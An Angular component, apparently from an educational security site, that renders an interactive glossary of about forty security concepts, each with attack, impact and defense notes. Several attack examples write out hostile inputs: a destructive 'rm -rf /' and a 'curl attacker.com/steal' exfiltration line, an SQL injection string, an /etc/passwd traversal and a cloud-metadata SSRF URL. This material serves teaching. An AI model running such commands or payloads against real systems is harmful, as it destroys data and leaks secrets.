import { Component, signal } from '@angular/core';

interface Term {
  name: string;
  simple: string;
  technical: string;
  why: string;
  attack: string;
  impact: string;
  defense: string;
  tradeoffs: string;
  related: string[];
}

const TERMS: Term[] = [
  // --- Injection family ---
  {
    name: 'Threat Modeling',
    simple: 'Thinking through, ahead of time, who might attack this system and how.',
    technical: 'A structured process of identifying assets, trust boundaries, attackers, and likely attack paths before or while designing a system.',
    why: 'It exists so security decisions are made deliberately, rather than discovered after an incident.',
    attack: 'Not an attack itself — its absence means real attack surfaces go unrecognized until exploited.',
    impact: 'Skipping it means the most dangerous entry points are often the ones no one thought to check.',
    defense: 'Regularly ask "what would an attacker try here" for every new feature, especially ones that accept input or move money/data.',
    tradeoffs: 'Takes upfront time that can feel like it slows delivery, even though it prevents costlier fixes later.',
    related: ['Attack Surface', 'Defense in Depth', 'Least Privilege'],
  },
  {
    name: 'Attack Surface',
    simple: 'Every point where an outsider could try to interact with or attack your system.',
    technical: 'The complete set of exposed endpoints, inputs, ports, and interfaces through which a system could be attacked.',
    why: 'Every exposed feature is a place an attacker could probe — surface area and risk grow together.',
    attack: 'Attackers scan for exposed endpoints, admin panels, and unused features as an entry point.',
    impact: 'A forgotten debug endpoint or unused admin route becomes the exact path an attacker finds.',
    defense: 'Disable unused routes and features, and audit what is actually exposed to the internet.',
    tradeoffs: 'Locking down every feature that "might be needed later" adds friction to development.',
    related: ['Threat Modeling', 'Security Misconfiguration', 'Least Privilege'],
  },
  {
    name: 'Injection',
    simple: 'Tricking a system into treating attacker-supplied data as commands or code.',
    technical: 'A vulnerability class where untrusted input is concatenated into a command, query, or interpreter without separating data from structure.',
    why: 'It exists because many systems historically built commands via string concatenation, blurring data and code.',
    attack: 'An attacker crafts input containing control characters or syntax the receiving interpreter executes.',
    impact: 'Ranges from data leakage to full command execution on the server, depending on what was injected into.',
    defense: 'Separate data from code structurally — parameterized queries, safe APIs, and strict input validation.',
    tradeoffs: 'Safe APIs sometimes require more verbose code than a quick string concatenation.',
    related: ['SQL Injection', 'Command Injection', 'Validation'],
  },
  {
    name: 'SQL Injection',
    simple: 'Sneaking SQL commands into a query through a text field.',
    technical: 'An injection attack where untrusted input alters the structure of a SQL query, letting an attacker read, modify, or delete data outside the intended scope.',
    why: 'It exists because building SQL by string concatenation lets attacker-controlled text change the query\'s meaning, not just its values.',
    attack: `A login field submits ' OR '1'='1 to bypass authentication, or a UNION SELECT to exfiltrate other tables.`,
    impact: 'Full database read/write, authentication bypass, or complete data exfiltration.',
    defense: 'Parameterized queries (prepared statements) that send values separately from query structure.',
    tradeoffs: 'None significant — parameterized queries are strictly safer and usually just as fast.',
    related: ['Parameterized Queries', 'Injection', 'Validation'],
  },
  {
    name: 'Parameterized Queries',
    simple: 'Sending the query structure and the data values to the database separately.',
    technical: 'A query execution technique (prepared statements) where placeholders in SQL are bound to values at execution time, so values can never alter query structure.',
    why: 'It exists to structurally close SQL injection rather than relying on filtering or escaping, which is easy to get wrong.',
    attack: 'Not directly attackable — bypassing it usually requires falling back to string-concatenated queries elsewhere in the code.',
    impact: 'When used consistently, SQL injection via that query path is effectively eliminated.',
    defense: 'Use your database driver or ORM\'s parameter binding for every query touching user input, with no exceptions.',
    tradeoffs: 'A handful of dynamic cases (like sorting by column name) require an allow-list instead, since values can\'t parameterize identifiers.',
    related: ['SQL Injection', 'Injection', 'Validation'],
  },
  {
    name: 'Command Injection',
    simple: 'Getting a server to run an operating-system command it wasn\'t supposed to.',
    technical: 'An injection attack where untrusted input is passed into a shell command or OS-level call without proper isolation, letting an attacker append or chain commands.',
    why: 'It exists wherever application code shells out to the OS using string-built commands that include user input.',
    attack: 'Submitting `; rm -rf /` or `&& curl attacker.com/steal` inside a field passed to a shell call.',
    impact: 'Arbitrary code execution on the server, often full host compromise.',
    defense: 'Avoid shelling out to the OS with user input; if unavoidable, use APIs that pass arguments as an array, never a concatenated string.',
    tradeoffs: 'Some legacy integrations rely on shell tools, requiring careful sandboxing or rewriting to avoid the pattern.',
    related: ['Injection', 'Validation', 'Least Privilege'],
  },

  // --- Validation / auth family ---
  {
    name: 'Validation',
    simple: 'Checking that input is actually well-formed and expected before using it.',
    technical: 'The process of checking that input conforms to expected type, format, range, and business rules before it is processed or stored.',
    why: 'It exists because any boundary the server doesn\'t control — a form, an API caller — can send anything.',
    attack: 'An attacker sends malformed, oversized, or unexpected input hoping a downstream system mishandles it.',
    impact: 'Unvalidated input is the entry point for injection, logic bypass, and application crashes.',
    defense: 'Validate on the server for every request, regardless of what client-side validation already did.',
    tradeoffs: 'Overly strict validation can reject legitimate, if unusual, valid input.',
    related: ['Injection', 'Least Privilege', 'Security Misconfiguration'],
  },
  {
    name: 'Authentication',
    simple: 'Proving who you are.',
    technical: 'The process of verifying a claimed identity, typically via a credential (password, token, certificate) the party is expected to hold.',
    why: 'It exists as the first checkpoint — every other security decision assumes you already know who is asking.',
    attack: 'Credential stuffing, phishing, brute force, or session token theft to impersonate a legitimate user.',
    impact: 'A bypassed or weak authentication step lets an attacker act as any user, including privileged ones.',
    defense: 'Strong password hashing, rate-limited login attempts, multi-factor authentication, and secure session/token handling.',
    tradeoffs: 'Stronger authentication (MFA, short sessions) adds friction to the login experience.',
    related: ['Password Hashing', 'Sessions', 'Authorization'],
  },
  {
    name: 'Password Hashing',
    simple: 'Storing a scrambled, one-way version of a password instead of the password itself.',
    technical: 'Running a password through a slow, salted, one-way cryptographic hash function (bcrypt, scrypt, Argon2) so the original cannot be recovered from the stored value.',
    why: 'It exists because a database leak should not hand attackers usable, plaintext passwords.',
    attack: 'If hashing is weak or absent, a leaked database yields passwords directly or via fast brute-force/rainbow-table attacks.',
    impact: 'Account takeover across this service and any other where the user reused the password.',
    defense: 'Use a purpose-built slow hash (bcrypt/Argon2) with a per-user salt — never a fast general-purpose hash like plain SHA-256.',
    tradeoffs: 'Slow hashing intentionally costs CPU time on every login — a deliberate, worthwhile trade for brute-force resistance.',
    related: ['Salting', 'Authentication', 'Encryption'],
  },
  {
    name: 'Salting',
    simple: 'Adding a unique random value to each password before hashing it.',
    technical: 'A unique, random value stored alongside each password hash, mixed in before hashing so identical passwords produce different hashes.',
    why: 'It exists to defeat precomputed rainbow-table attacks and to stop identical passwords from producing identical hashes.',
    attack: 'Without salting, attackers precompute hash tables for common passwords and reverse them instantly on a leak.',
    impact: 'An unsalted hash scheme lets an attacker crack many accounts at once using shared precomputed tables.',
    defense: 'Use a hashing library that generates and stores a unique salt automatically (bcrypt and Argon2 do this by default).',
    tradeoffs: 'None meaningful — salting is essentially free and should always be used alongside hashing.',
    related: ['Password Hashing', 'Encryption', 'Authentication'],
  },
  {
    name: 'Encryption',
    simple: 'Scrambling data so only someone with the right key can read it back.',
    technical: 'A reversible transformation of data using a key, so the original plaintext can be recovered only by parties holding the correct key.',
    why: 'It exists to protect data confidentiality in transit and at rest, distinct from hashing which is deliberately irreversible.',
    attack: 'Weak algorithms, hardcoded keys, or missing encryption in transit expose data to interception or theft.',
    impact: 'Sensitive data (PII, payment details) is readable by anyone who intercepts it or accesses storage directly.',
    defense: 'Use TLS in transit and vetted, modern algorithms with securely managed keys at rest — never roll your own crypto.',
    tradeoffs: 'Encryption at rest adds key-management complexity and a small performance cost.',
    related: ['Password Hashing', 'Secrets Management', 'Security Headers'],
  },

  // --- Session/token family ---
  {
    name: 'Sessions',
    simple: 'The server remembering that you\'re logged in across multiple requests.',
    technical: 'A server-side (or signed client-side) mechanism that associates a series of stateless HTTP requests with an authenticated identity, typically via a session identifier.',
    why: 'HTTP is stateless by default — sessions exist to carry identity across requests without re-authenticating every time.',
    attack: 'Session fixation or hijacking — an attacker obtains or forces a valid session identifier to impersonate the user.',
    impact: 'Full account takeover for the duration the stolen session remains valid.',
    defense: 'Regenerate session IDs on login, set reasonable expiry, and bind cookies with HttpOnly, Secure, and SameSite.',
    tradeoffs: 'Shorter session lifetimes are safer but force more frequent re-logins.',
    related: ['Cookies', 'JWT', 'Authentication'],
  },
  {
    name: 'Cookies',
    simple: 'A small piece of data the browser stores and automatically resends to the same site.',
    technical: 'A key-value pair set by the server and stored client-side, automatically attached to subsequent requests to the same origin (subject to its scope and flags).',
    why: 'They exist to let a stateless protocol (HTTP) carry small pieces of persistent client-side data, like session identifiers.',
    attack: 'Cookie theft via XSS, or automatic cookie replay abused via CSRF, since browsers attach cookies to cross-site requests by default.',
    impact: 'A stolen session cookie grants an attacker the victim\'s authenticated session outright.',
    defense: 'Set HttpOnly (blocks JS access), Secure (HTTPS only), and SameSite (limits cross-site sending).',
    tradeoffs: 'HttpOnly reduces but doesn\'t eliminate XSS-related exposure, since other tokens can still leak; SameSite mitigates but isn\'t a universal CSRF fix.',
    related: ['Sessions', 'CSRF', 'XSS'],
  },
  {
    name: 'JWT',
    simple: 'A compact, signed token that carries claims about a user, which the server can verify without a database lookup.',
    technical: 'JSON Web Token — a signed (and optionally encrypted) token encoding claims as a base64url JSON payload, verified via a signature rather than server-side session storage.',
    why: 'It exists to allow stateless authentication — any server holding the verification key can trust the token without a shared session store.',
    attack: 'Algorithm confusion (e.g. accepting "none"), weak/leaked signing secrets, or trusting an unverified payload.',
    impact: 'A forged or tampered token that passes verification grants an attacker any claims they choose to encode.',
    defense: 'Verify signatures with a fixed, expected algorithm, keep tokens short-lived, and never store sensitive secrets in the payload.',
    tradeoffs: 'JWT payloads are base64-encoded, not encrypted by default — anyone holding the token can read the claims, so revocation before expiry is also harder than with server-side sessions.',
    related: ['Sessions', 'API Keys', 'OAuth'],
  },
  {
    name: 'API Keys',
    simple: 'A long secret string a client sends to prove it\'s allowed to call an API.',
    technical: 'A static, opaque credential issued to a client (often a service, not a human) to authenticate API requests, typically sent as a header.',
    why: 'They exist for machine-to-machine or third-party integration auth, where a human login flow doesn\'t fit.',
    attack: 'A leaked key (in client-side code, logs, or a public repo) can be used by anyone who finds it, indefinitely.',
    impact: 'Full access to whatever the key is scoped to, often billed or attributed to the legitimate owner.',
    defense: 'Scope keys narrowly, never embed them in client-side code, and support rotation and revocation.',
    tradeoffs: 'Unlike short-lived tokens, static keys usually stay valid a long time unless actively rotated.',
    related: ['JWT', 'Secrets Management', 'OAuth'],
  },
  {
    name: 'OAuth',
    simple: 'Letting a user grant one app limited access to their data on another app, without sharing their password.',
    technical: 'An authorization delegation framework where a resource owner grants a client limited, scoped access to a resource server via tokens issued by an authorization server.',
    why: 'It exists to avoid sharing passwords with third-party apps, and to allow scoped, revocable access instead.',
    attack: 'Misconfigured redirect URIs or overly broad scopes let an attacker intercept authorization codes or tokens.',
    impact: 'An attacker can obtain a valid access token for the victim\'s account within the granted scope.',
    defense: 'Strictly validate redirect URIs, use PKCE for public clients, and request the minimum necessary scope.',
    tradeoffs: 'OAuth flows are notably more complex to implement correctly than a simple shared-secret scheme.',
    related: ['OIDC', 'JWT', 'API Keys'],
  },
  {
    name: 'OIDC',
    simple: 'A standard way to actually log a user in on top of OAuth, which by itself only handles access — not identity.',
    technical: 'OpenID Connect — an identity layer built on top of OAuth 2.0 that adds a standardized ID token (a JWT) asserting who the authenticated user is.',
    why: 'It exists because OAuth alone defines authorization (access) but not a standard way to authenticate (identity) — OIDC fills that gap.',
    attack: 'Accepting an ID token without validating its issuer, audience, and signature lets a forged identity assertion through.',
    impact: 'An attacker can impersonate a user\'s identity within a federated login flow.',
    defense: 'Validate the ID token\'s signature, issuer, audience, and expiry on every login using a trusted library.',
    tradeoffs: 'Requires trusting an external identity provider\'s security posture as part of your own.',
    related: ['OAuth', 'JWT', 'Authentication'],
  },

  // --- Authorization family ---
  {
    name: 'Authorization',
    simple: 'Deciding what a verified identity is actually allowed to do.',
    technical: 'The process of determining whether an authenticated identity has permission to perform a specific action on a specific resource.',
    why: 'Authentication answers "who are you"; authorization answers the separate question of "what are you allowed to do" — conflating them is a common source of bugs.',
    attack: 'Calling an endpoint or accessing a resource the authenticated user should not be permitted to touch.',
    impact: 'Ranges from viewing another user\'s data to performing admin-level actions as a regular user.',
    defense: 'Check authorization explicitly on every sensitive action, server-side, every time — never infer it from authentication alone.',
    tradeoffs: 'Fine-grained authorization checks add code paths that must each be tested and kept correct.',
    related: ['RBAC', 'BOLA', 'Authentication'],
  },
  {
    name: 'RBAC',
    simple: 'Granting permissions based on a user\'s role, instead of one-by-one per user.',
    technical: 'Role-Based Access Control — an authorization model where permissions are attached to roles, and users are assigned to roles rather than receiving permissions directly.',
    why: 'It exists to make permission management tractable at scale — you manage a handful of roles, not a matrix per individual user.',
    attack: 'Role assignment bugs (e.g. a new user defaulting to "admin") or overly broad roles granting more than intended.',
    impact: 'A misassigned role can grant a low-privilege user administrative capability across the whole system.',
    defense: 'Default new roles to minimal privilege, audit role assignments regularly, and keep roles granular.',
    tradeoffs: 'Very fine-grained roles become numerous and hard to manage; very broad roles over-grant access.',
    related: ['Authorization', 'Least Privilege', 'BOLA'],
  },
  {
    name: 'BOLA',
    simple: 'An authenticated user reaching data or objects that belong to someone else, by changing an ID.',
    technical: 'Broken Object Level Authorization — an API vulnerability where object-level ownership or permission is not verified before returning or modifying a requested object.',
    why: 'It exists because authentication is often mistaken for sufficient access control — the API forgets to check "is this actually yours."',
    attack: `Changing /orders/123 to /orders/124 in an authenticated request and receiving another user's order.`,
    impact: 'Mass data exposure or modification across every object accessible via a predictable or enumerable identifier.',
    defense: 'Check that the authenticated identity owns or is permitted to access the specific object, on every request, server-side.',
    tradeoffs: 'Requires an explicit ownership check on every object-returning endpoint, which is easy to forget to add.',
    related: ['IDOR', 'Authorization', 'Validation'],
  },
  {
    name: 'IDOR',
    simple: 'A closely related term to BOLA — referencing an internal object (a file, a record) directly and predictably, without an access check.',
    technical: 'Insecure Direct Object Reference — exposing a direct reference (an ID, filename, or key) to an internal object, without verifying the requester is authorized for that specific object.',
    why: 'It exists wherever object identifiers are predictable or guessable and are trusted as the only access gate.',
    attack: 'Guessing or enumerating sequential IDs, or a leaked reference URL, to access objects outside the intended scope.',
    impact: 'Unauthorized read or write access to other users\' data, files, or records.',
    defense: 'Use unguessable identifiers where reasonable, but rely primarily on an explicit authorization check, not obscurity.',
    tradeoffs: 'Switching to opaque/random IDs alone is not sufficient — it must be paired with an actual authorization check.',
    related: ['BOLA', 'Authorization', 'Validation'],
  },
  {
    name: 'Rate Limiting',
    simple: 'Capping how many requests one client can make in a period of time.',
    technical: 'Enforcing a maximum number of requests per identity, key, or IP over a time window, rejecting or delaying requests beyond it.',
    why: 'It exists to bound the damage a single client — malicious or accidental — can inflict through repeated calls.',
    attack: 'Brute-forcing credentials, scraping data at scale, or overwhelming an endpoint with sheer volume.',
    impact: 'Without it, a single client can attempt unlimited logins, scrape an entire dataset, or degrade service for everyone.',
    defense: 'Apply per-identity and per-IP limits on sensitive and expensive endpoints, with clear rejection responses.',
    tradeoffs: 'Overly strict limits risk false positives against legitimate bursts of real traffic.',
    related: ['Timing Attacks', 'Authorization', 'Logging'],
  },
  {
    name: 'Timing Attacks',
    simple: 'Guessing secret information by measuring how long a system takes to respond.',
    technical: 'A side-channel attack that infers secret data by measuring small differences in response time caused by non-constant-time comparisons or logic branches.',
    why: 'They exist because naive comparisons (like checking a password byte-by-byte and returning early on mismatch) leak information through response latency.',
    attack: 'Measuring subtle latency differences between "user does not exist" and "user exists, wrong password" to enumerate valid usernames.',
    impact: 'Leaks whether a username, API key, or token is valid, aiding further targeted attacks.',
    defense: 'Use constant-time comparison functions for secrets, and return uniform responses and timings for auth failures.',
    tradeoffs: 'Constant-time code is sometimes less readable and slightly more effort to write correctly.',
    related: ['Rate Limiting', 'Authentication', 'Logging'],
  },

  // --- Client-side attack family ---
  {
    name: 'XSS',
    simple: 'Getting a victim\'s browser to run attacker-controlled script on a trusted page.',
    technical: 'Cross-Site Scripting — an injection vulnerability where untrusted input is rendered into a page as executable script or markup instead of inert text.',
    why: 'It exists wherever user-controlled content is output into HTML without proper context-aware encoding.',
    attack: 'Injecting `<script>` or event-handler payloads into a comment field, profile bio, or URL parameter that gets rendered back.',
    impact: 'Session/cookie theft, keylogging, or full page manipulation in the context of the victim\'s authenticated session.',
    defense: 'Context-aware output encoding, a strict Content-Security-Policy, and treating all rendered user input as untrusted.',
    tradeoffs: 'Strict CSP can break legitimate inline scripts or third-party widgets, requiring careful auditing.',
    related: ['Security Headers', 'CSRF', 'Validation'],
  },
  {
    name: 'CSRF',
    simple: 'Tricking a logged-in victim\'s browser into submitting a request they never intended to make.',
    technical: 'Cross-Site Request Forgery — an attack that leverages a victim\'s existing authenticated session, via automatically-attached cookies, to submit a forged request from another origin.',
    why: 'It exists because browsers attach cookies to requests regardless of which site initiated them, unless explicitly restricted.',
    attack: 'An attacker-hosted page auto-submits a form to a bank\'s "transfer funds" endpoint while the victim is logged in.',
    impact: 'State-changing actions performed as the victim without their knowledge — transfers, password changes, purchases.',
    defense: 'CSRF tokens tied to the session, plus SameSite cookies, on every state-changing request.',
    tradeoffs: 'SameSite mitigates but isn\'t a universal fix — some legitimate cross-site flows (e.g. certain redirects) need careful handling.',
    related: ['Cookies', 'XSS', 'Security Headers'],
  },
  {
    name: 'Security Headers',
    simple: 'Response headers that tell the browser to enforce extra safety rules on a page.',
    technical: 'HTTP response headers (CSP, X-Content-Type-Options, X-Frame-Options, Strict-Transport-Security, etc.) instructing the browser to apply defensive behaviors.',
    why: 'They exist to push protective behavior down to the browser, which is in the best position to enforce it at render time.',
    attack: 'Missing headers leave the door open to clickjacking, MIME-sniffing, and script injection that a header would have blocked.',
    impact: 'Without them, otherwise-preventable client-side attacks (XSS, clickjacking) succeed more easily.',
    defense: 'Set a strict CSP, X-Frame-Options/frame-ancestors, X-Content-Type-Options: nosniff, and HSTS on every response.',
    tradeoffs: 'A strict CSP requires auditing every script/style source the page actually needs, which takes deliberate effort.',
    related: ['XSS', 'CORS', 'CSRF'],
  },
  {
    name: 'CORS',
    simple: 'Rules that tell browsers which other websites are allowed to read the response to a request.',
    technical: 'Cross-Origin Resource Sharing — an HTTP header-based mechanism that lets a server explicitly declare which origins may read responses to its cross-origin requests.',
    why: 'It exists because browsers block cross-origin reads by default (the same-origin policy) — CORS is the controlled exception.',
    attack: 'A misconfigured `Access-Control-Allow-Origin: *` combined with credentials exposes authenticated responses to any origin.',
    impact: 'Any website can read sensitive API responses on behalf of a logged-in victim if CORS is too permissive.',
    defense: 'Allow-list specific trusted origins explicitly; never combine a wildcard origin with credentialed requests.',
    tradeoffs: 'A tight allow-list requires updating configuration whenever a new legitimate frontend origin is added.',
    related: ['Security Headers', 'CSRF', 'Security Misconfiguration'],
  },

  // --- Operational / hygiene family ---
  {
    name: 'Security Misconfiguration',
    simple: 'A security problem caused by settings, not by broken code — something left open, verbose, or default.',
    technical: 'A broad vulnerability class covering insecure default settings, verbose error output, unnecessary features left enabled, or missing hardening across any layer of the stack.',
    why: 'It exists because secure code can still be undermined by an insecure environment, framework setting, or deployment configuration.',
    attack: 'Scanning for default admin credentials, exposed debug endpoints, verbose stack traces, or open directory listings.',
    impact: 'Ranges from information disclosure (stack traces revealing internals) to full system compromise (default admin creds).',
    defense: 'Harden defaults, disable debug/verbose modes in production, and regularly audit configuration against a checklist.',
    tradeoffs: 'Hardening can occasionally block legitimate debugging convenience during development.',
    related: ['Attack Surface', 'Secrets Management', 'Dependency Security'],
  },
  {
    name: 'Secrets Management',
    simple: 'Storing and handling credentials, keys, and tokens so they don\'t leak.',
    technical: 'The practice and tooling (vaults, environment injection, rotation policies) used to store, distribute, and rotate sensitive credentials without hardcoding or logging them.',
    why: 'It exists because secrets hardcoded or committed to source end up in places (repos, logs, backups) far outside their intended scope.',
    attack: 'Scanning public repositories, build logs, or client-side bundles for accidentally committed keys and credentials.',
    impact: 'A single leaked secret can grant broad access to infrastructure, data, or third-party billed services.',
    defense: 'Use a secrets manager, inject secrets at runtime, never log them, and rotate on any suspected exposure.',
    tradeoffs: 'Adds infrastructure and operational overhead compared to a plain config file.',
    related: ['API Keys', 'Least Privilege', 'Security Misconfiguration'],
  },
  {
    name: 'SSRF',
    simple: 'Tricking a server into making a request to a destination the attacker chose, often an internal one.',
    technical: 'Server-Side Request Forgery — a vulnerability where an application fetches a URL supplied or influenced by an attacker, allowing requests to internal or unintended destinations.',
    why: 'It exists wherever a server-side feature fetches a user-supplied URL (image import, webhook, PDF renderer) without restricting the destination.',
    attack: `Supplying an internal URL like http://169.254.169.254/ (a cloud metadata endpoint) as the "image URL" to fetch.`,
    impact: 'Access to internal-only services, cloud credentials via metadata endpoints, or network reconnaissance behind the firewall.',
    defense: 'Restrict outbound destinations with an allow-list, block internal/link-local address ranges, and disable unneeded redirects.',
    tradeoffs: 'A strict destination allow-list can break legitimate integrations that need broad or dynamic destinations.',
    related: ['Validation', 'Attack Surface', 'Least Privilege'],
  },
  {
    name: 'File Upload Security',
    simple: 'Making sure an uploaded file can\'t become a way to run code or overwrite something important.',
    technical: 'The set of controls (type checking, size limits, storage isolation, re-encoding) applied to user-uploaded files to prevent them from being executed or misused.',
    why: 'It exists because an upload feature is effectively giving an outside party a way to place a file inside your system.',
    attack: 'Uploading a script disguised with an image extension into a web-served, executable directory.',
    impact: 'Remote code execution if the uploaded file lands somewhere the server will execute or interpret it.',
    defense: 'Validate real content type (not just extension), store uploads outside the web root, and serve them from a non-executable path.',
    tradeoffs: 'Re-encoding or sandboxing every upload adds processing time and infrastructure.',
    related: ['Path Traversal', 'Validation', 'Least Privilege'],
  },
  {
    name: 'Path Traversal',
    simple: 'Using "../" tricks in a filename to escape the intended folder and reach other files.',
    technical: 'A vulnerability where insufficient sanitization of a file path parameter allows an attacker to reference files outside the intended directory using relative path segments.',
    why: 'It exists wherever a file path is built by concatenating user input directly into a filesystem call.',
    attack: `Requesting a file like ../../../../etc/passwd through a parameter meant to select a file within one folder.`,
    impact: 'Disclosure of arbitrary files on the server, including configuration files and secrets, or writing to unintended locations.',
    defense: 'Resolve and canonicalize paths, then verify they remain within an allowed base directory before use.',
    tradeoffs: 'Overly rigid path handling can reject legitimate nested-directory use cases if not implemented carefully.',
    related: ['File Upload Security', 'Validation', 'Least Privilege'],
  },
  {
    name: 'Least Privilege',
    simple: 'Giving every identity only the access it actually needs, and no more.',
    technical: 'A principle where every user, service, or process is granted the minimum set of permissions necessary to perform its function.',
    why: 'It exists to bound the damage any single compromised identity or component can cause.',
    attack: 'An attacker who compromises one over-privileged component pivots to access far more than that component needed.',
    impact: 'A breach\'s blast radius is proportional to how much access the compromised identity actually held.',
    defense: 'Scope roles and credentials narrowly per service, and periodically review and revoke unused permissions.',
    tradeoffs: 'Narrow scoping means more roles and credentials to define and maintain over time.',
    related: ['RBAC', 'Secrets Management', 'Defense in Depth'],
  },
  {
    name: 'Dependency Security',
    simple: 'Making sure the third-party libraries your code relies on aren\'t themselves vulnerable.',
    technical: 'The practice of tracking, updating, and auditing third-party dependencies for known vulnerabilities (CVEs) and risky transitive packages.',
    why: 'It exists because most applications are built substantially from external code, which carries its own attack surface.',
    attack: 'Exploiting a known, unpatched vulnerability in an outdated library the application still depends on.',
    impact: 'The severity of the underlying vulnerability, applied transitively to every application that hasn\'t patched it.',
    defense: 'Automated dependency scanning, prompt patching of known CVEs, and minimizing unnecessary dependencies.',
    tradeoffs: 'Aggressive auto-updating risks breaking changes; too-slow patching leaves known vulnerabilities exposed longer.',
    related: ['Security Misconfiguration', 'Attack Surface', 'Logging'],
  },
  {
    name: 'Logging',
    simple: 'Recording what happened in the system so it can be reviewed later.',
    technical: 'The practice of recording structured, timestamped records of application and security-relevant events for later review, alerting, or forensics.',
    why: 'It exists because you cannot investigate, detect, or prove what happened during an incident without a record of it.',
    attack: 'Attackers often try to disable or flood logging to hide their activity ("log evasion").',
    impact: 'Without adequate logging, a breach can go undetected for months and be nearly impossible to reconstruct afterward.',
    defense: 'Log authentication events, authorization failures, and sensitive actions with enough context to investigate later.',
    tradeoffs: 'Verbose logging can itself leak sensitive data if not scrubbed, and adds storage/processing cost.',
    related: ['Auditing', 'Rate Limiting', 'Incident Response'],
  },
  {
    name: 'Auditing',
    simple: 'Reviewing logs and access records to confirm things happened the way they should.',
    technical: 'The systematic review of recorded events — access logs, permission changes, admin actions — to verify compliance, detect anomalies, or investigate an incident.',
    why: 'It exists because logs are only useful if someone, or some system, actually reviews them.',
    attack: 'A lack of auditing means suspicious patterns in existing logs go unnoticed indefinitely.',
    impact: 'Incidents that were technically logged but never audited are effectively invisible until much later, if ever.',
    defense: 'Set up automated alerting on suspicious patterns and schedule periodic manual review of sensitive-action logs.',
    tradeoffs: 'Meaningful auditing requires dedicated tooling and time that can compete with feature work.',
    related: ['Logging', 'Incident Response', 'RBAC'],
  },
  {
    name: 'Defense in Depth',
    simple: 'Stacking multiple independent security layers so no single failure is catastrophic.',
    technical: 'A design strategy that layers independent, redundant security controls so that the failure of any one does not fully compromise the system.',
    why: 'It exists because no single control is perfect — layering assumes each one might fail and plans for that.',
    attack: 'An attacker who bypasses one control (e.g. validation) is still stopped by the next (e.g. parameterized queries, least privilege).',
    impact: 'Without it, a single missed check anywhere in the stack becomes a complete compromise.',
    defense: 'Combine validation, authorization, least privilege, encryption, and monitoring — never rely on just one.',
    tradeoffs: 'More layers mean more code, more configuration, and more surface to maintain correctly.',
    related: ['Least Privilege', 'Threat Modeling', 'Incident Response'],
  },
  {
    name: 'Incident Response',
    simple: 'The plan and process for what to do once you know a breach happened.',
    technical: 'The predefined process for detecting, containing, eradicating, and recovering from a security incident, followed by a post-incident review.',
    why: 'It exists because incidents will happen eventually, and a rehearsed plan responds faster and with less damage than an improvised one.',
    attack: 'A slow or absent response lets an active attacker continue operating for far longer than necessary.',
    impact: 'The difference between a contained, understood incident and a prolonged, expanding breach often comes down to response speed.',
    defense: 'Maintain a written response plan, defined roles, and practiced runbooks, and conduct blameless post-incident reviews.',
    tradeoffs: 'Maintaining response readiness (drills, on-call, tooling) has an ongoing cost even when no incident occurs.',
    related: ['Logging', 'Auditing', 'Defense in Depth'],
  },
];

@Component({
  selector: 'app-security-terminology-map',
  standalone: true,
  imports: [],
  template: `
    <section class="lab-section" id="security-terminology">
      <div class="container">
        <p class="lab-index">37 — CONNECTED SECURITY CONCEPTS</p>
        <h2 class="lab-title">Every security term here means something because of the terms around it.</h2>
        <p class="lab-lede">
          Click a term to unpack it &mdash; plain language, the precise definition, why it exists, how it's attacked,
          its impact, its defense, and its trade-offs. Then follow the related terms to see how the vocabulary connects.
        </p>

        <div class="term-grid">
          @for (t of terms; track t.name) {
            <button
              type="button"
              class="lab-btn term-chip"
              [class.is-active]="selected().name === t.name"
              (click)="select(t)"
            >
              {{ t.name }}
            </button>
          }
        </div>

        <div class="lab-panel detail-panel">
          <p class="detail-name">{{ selected().name }}</p>

          <div class="detail-block">
            <p class="detail-label mono">PLAIN LANGUAGE</p>
            <p class="detail-text">{{ selected().simple }}</p>
          </div>

          <div class="detail-block">
            <p class="detail-label mono">TECHNICAL DEFINITION</p>
            <p class="detail-text">{{ selected().technical }}</p>
          </div>

          <div class="detail-block">
            <p class="detail-label mono">WHY IT EXISTS</p>
            <p class="detail-text">{{ selected().why }}</p>
          </div>

          <div class="detail-block">
            <p class="detail-label mono attack-label">ATTACK</p>
            <p class="detail-text">{{ selected().attack }}</p>
          </div>

          <div class="detail-block">
            <p class="detail-label mono attack-label">IMPACT</p>
            <p class="detail-text">{{ selected().impact }}</p>
          </div>

          <div class="detail-block">
            <p class="detail-label mono defense-label">DEFENSE</p>
            <p class="detail-text">{{ selected().defense }}</p>
          </div>

          <div class="detail-block">
            <p class="detail-label mono">TRADE-OFFS</p>
            <p class="detail-text">{{ selected().tradeoffs }}</p>
          </div>

          <div class="detail-block related-block">
            <p class="detail-label mono">RELATED TERMS</p>
            <div class="related-row">
              @for (r of selected().related; track r) {
                <button type="button" class="lab-btn related-chip" (click)="selectByName(r)">{{ r }}</button>
              }
            </div>
          </div>
        </div>
      </div>
    </section>
  `,
  styles: `
    :host {
      display: block;
      --trust: #4ade80;
      --suspicious: var(--accent);
      --attack: var(--danger);
      --compromised: #dc2626;
      --blocked: #4fd3e8;
      --c-client: var(--accent-2);
      --c-server: #60a5fa;
      --c-db: #a78bfa;
      --c-attacker: #f472b6;
    }

    .term-grid { margin-top: 24px; display: flex; flex-wrap: wrap; gap: 10px; }
    .term-chip { font-size: 0.8125rem; }

    .detail-panel { margin-top: 24px; }
    .detail-name { font-size: 1.375rem; font-weight: 700; color: var(--accent-strong); }

    .detail-block { margin-top: 18px; }
    .detail-block:first-of-type { margin-top: 20px; }
    .detail-label { font-size: 0.6875rem; color: var(--accent-2); letter-spacing: 0.06em; margin-bottom: 6px; }
    .attack-label { color: var(--attack); }
    .defense-label { color: var(--blocked); }
    .detail-text { font-size: 0.9375rem; color: var(--text-muted); line-height: 1.55; }

    .related-block { padding-top: 16px; border-top: 1px solid var(--border); }
    .related-row { display: flex; flex-wrap: wrap; gap: 8px; }
    .related-chip { font-size: 0.75rem; padding: 6px 12px; color: var(--text-muted); }
    .related-chip:hover { color: var(--text); }
  `,
})
export class SecurityTerminologyMap {
  protected readonly terms = TERMS;
  protected readonly selected = signal<Term>(TERMS[0]);

  select(t: Term): void {
    this.selected.set(t);
  }

  selectByName(name: string): void {
    const t = this.terms.find((term) => term.name === name);
    if (t) this.selected.set(t);
  }
}
